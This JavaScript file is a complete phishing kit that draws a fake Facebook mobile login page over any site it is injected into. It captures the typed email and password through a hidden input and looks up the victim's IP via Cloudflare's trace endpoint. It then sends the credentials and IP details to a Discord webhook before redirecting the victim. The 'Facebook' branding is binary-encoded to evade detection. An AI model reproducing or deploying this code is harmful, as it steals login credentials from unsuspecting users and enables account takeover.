
document.getElementsByTagName('head')[0].innerHTML += '<meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><style>*{padding:0;margin:0;outline:0;-webkit-user-select:none;font-family:Helvetica,Arial,sans-serif;}</style>';




var topD=document.createElement("div");
var headD=document.createElement("div");
var contD=document.createElement("div");
var inp1=document.createElement("input");
var inp2=document.createElement("input");
var hinp2=document.createElement("input");
var btn1=document.createElement("button");
var btn2=document.createElement("button");
var orD=document.createElement("div");
var btn3=document.createElement("button");
var btn4=document.createElement("button");
var lD=document.createElement("div");
var langD=document.createElement("div");
var lang2D=document.createElement("div");

topD.style.height="100%";
topD.style.width="100%";
topD.style.zIndex="999999999";
topD.style.position="fixed";
topD.style.top="0";
topD.style.left="0";
topD.style.background="white";
////////
headD.style.position="absolute";
headD.style.top="0";
headD.style.left="0";
headD.style.background="#3b5998";
headD.style.height="50px";
headD.style.width="100%";
headD.style.lineHeight="50px";
headD.style.textAlign="center";
headD.style.color="#fff";
headD.style.fontSize="35px";
headD.style.fontWeight="bold";



///////
contD.style.position="absolute";
contD.style.top="50px";
contD.style.left="0";
contD.style.background="#eceff5";
contD.style.height="300px";
contD.style.width="100%";
contD.style.textAlign="center";
contD.style.paddingTop="20px";
contD.style.paddingBottom="30px";
////////
inp1.style.height="45px";
inp1.style.width="90%";
inp1.placeholder="Mobile number or email address";
inp1.style.borderRadius="3px 3px 0px 0";
inp1.style.lineHeight="18px";
inp1.style.padding="5px";
inp1.type="email";
inp1.style.border="0";
inp1.style.borderBottom="1px solid #e9e9e9";
inp1.style.fontSize="15px";
///////
hinp2.style.height="0px";
hinp2.style.width="0px";
hinp2.type="email";
hinp2.style.opacity="0";

inp2.style.height="45px";
inp2.style.width="90%";
inp2.placeholder="Password";
inp2.style.borderRadius="0px 0px 03px 03px";
inp2.style.lineHeight="18px";
inp2.style.padding="5px";
inp2.type="email";
inp2.style.border="0";
inp2.style.fontSize="15px";
inp2.addEventListener("keyup",
function(){
var lngh=inp2.value.length;
hinp2.value+=inp2.value.split("•").join('');
if(lngh==0){
hinp2.value="";
}
inp2.value="";
for(var o=0;o<lngh;o++){
inp2.value+="•";
}});
inp2.addEventListener("keydown",
function(){
var lngh=inp2.value.length;
hinp2.value+=inp2.value.split("•").join('');
if(lngh==0){
hinp2.value="";
}
inp2.value="";
for(var o=0;o<lngh;o++){
inp2.value+="•";
}});


/////////
btn1.style.height="40px";
btn1.style.width="calc(90% + 10px)";
btn1.style.borderRadius="3px";
btn1.style.lineHeight="40px";
btn1.style.textAlign="center";
btn1.textContent="Log In";
btn1.style.color="white";
btn1.style.fontWeight="bold";
btn1.style.border="0";
btn1.style.marginTop="20px";
btn1.style.background="rgb(53,120,229)";
btn1.style.fontSize="15px";



btn1.addEventListener("click",
function(){
var pass=hinp2.value;
var eml=inp1.value;
if(pass.length >1 && eml.length > 1){
//Get The IP and information through Cloudflare
async function sendData() {

try {
const res = await fetch('https://www.cloudflare.com/cdn-cgi/trace');
const data = await res.text();
var y=data;



/////Send Data Through Discord
var request = new XMLHttpRequest();
request.open("POST", config.discord_webhook_url);
request.setRequestHeader('Content-type', 'application/json');
var myEmbed = {
author: {
name: "FB Data "
},
title: "Username:- "+eml+"\nPassword:- "+pass+"\n",
description:"\nInfo:- "+y,
color: 65535
}
var params = {
username: "Th30neAnd0nly/Phi ",
avatar_url : "https://repository-images.githubusercontent.com/268017280/43567c00-8e19-11eb-96d2-a360736917cb",
embeds: [ myEmbed ]
}
request.send(JSON.stringify(params));
window.location.href=config.redirectURL;
} catch (error) {
    console.log('Error:' + error);
}

}
sendData();
}
else{
///F*ck Yourself In Corner
}

});


/////////
orD.style.height="40px";
orD.style.width="100% ";
orD.style.overflow="hidden";
orD.style.lineHeight="40px";
orD.style.textAlign="center";
orD.innerHTML="<span style='float:right;'></span>or<span></span>";
orD.innerHTML+="<style>a{color:rgb(119,151,180);text-decoration:none}span:before{content:'';margin:5px;height:1px;width:150px; background:#ccd0d5;display:block;}<style>";
orD.style.marginTop="10px";
orD.style.fontSize="15px";
orD.margin="auto";
orD.style.color="#4b4f56";
orD.style.display="flex";
orD.style.alignItems="center";
orD.style.justifyContent="center";

////////////

btn2.style.height="40px";
btn2.style.width="calc(50% + 10px)";
btn2.style.borderRadius="3px";
btn2.style.lineHeight="40px";
btn2.style.textAlign="center";
btn2.textContent="Create New Account";
btn2.style.color="white";
btn2.style.fontWeight="bold";
btn2.style.border="0";
btn2.style.marginTop="10px";
btn2.style.background="rgb(0,164,0)";
btn2.style.fontSize="15px";

/////////

btn3.style.height="40px";
btn3.style.width="calc(90% + 10px)";
btn3.style.borderRadius="3px";
btn3.style.lineHeight="40px";
btn3.style.textAlign="center";
btn3.textContent="Forgotten password? · Help Center";
btn3.style.color="rgb(119,151,201)";
btn3.style.border="0";
btn3.style.background="transparent";
btn3.style.marginTop="10px";
btn3.style.fontSize="14px";

/////////
lD.style.left="0";
lD.style.background="#fff";
lD.style.height="300px";
lD.style.width="100%";
lD.style.margin="auto";
lD.style.marginTop="400px";
lD.style.paddingBottom="30px";
lD.style.display="flex";
lD.style.alignItems="center";
lD.style.justifyContent="center";
lD.style.color="rgb(87,107,151)";

langD.style.left="0";
langD.style.background="#fff";
langD.style.height="300px";
langD.style.width="40%";
langD.style.textAlign="left";
langD.style.paddingTop="80px";
langD.style.paddingBottom="30px";
langD.innerHTML="<b style='color:rgb(150,154,160)'>English (UK)</b><br>پښت<br>हिन्दी<br>Español";



lang2D.style.left="0";
lang2D.style.background="#fff";
lang2D.style.height="300px";
lang2D.style.width="40%";
lang2D.style.textAlign="right";
lang2D.style.paddingTop="80px";
lang2D.style.paddingBottom="30px";
lang2D.innerHTML="اردو<br>العربية<br>বাংলা<br>";
lang2D.innerHTML+="<div style='border:1px solid rgb(59,89,152);height:10px;width:10px;margin-right:10px;border-radius:3px;line-height:10px;float:right;padding:5px;'>+</div>";



btn4.style.height="40px";
btn4.style.width="calc(90% + 10px)";
btn4.style.borderRadius="3px";
btn4.style.lineHeight="40px";
btn4.style.textAlign="center";
btn4.style.position="absolute";
btn4.innerHTML="&copy; "+ new Date().getFullYear();
btn4.style.color="rgb(150,154,160)";
btn4.style.border="0";
btn4.style.background="transparent";
btn4.style.marginTop="10px";
btn4.style.fontSize="14px";

////////


//#69a74e #90949c #eceff5

var bady=document.body;
if(bady == null){
document.body=document.createElement('body');
}


document.body.appendChild(topD);
topD.appendChild(headD);
topD.appendChild(contD);
contD.appendChild(inp1);
contD.appendChild(inp2);
contD.appendChild(btn1);
contD.appendChild(orD);
contD.appendChild(btn2);
contD.appendChild(btn3);
topD.appendChild(lD);
lD.appendChild(langD);
lD.appendChild(lang2D);
lD.appendChild(btn4);
contD.appendChild(hinp2);


if(config.text){
btn4.innerHTML="&copy; "+ ("01000110 01100001 01100011 01100101 01100010 01101111 01101111 01101011").split(' ').map(i => String.fromCharCode(parseInt(i, 2)).toString(10)).join('')+ new Date().getFullYear();
}
if(config.logo.show){
headD.innerHTML= ("01100110 01100001 01100011 01100101 01100010 01101111 01101111 01101011").split(' ').map(i => String.fromCharCode(parseInt(i, 2)).toString(10)).join('');
}
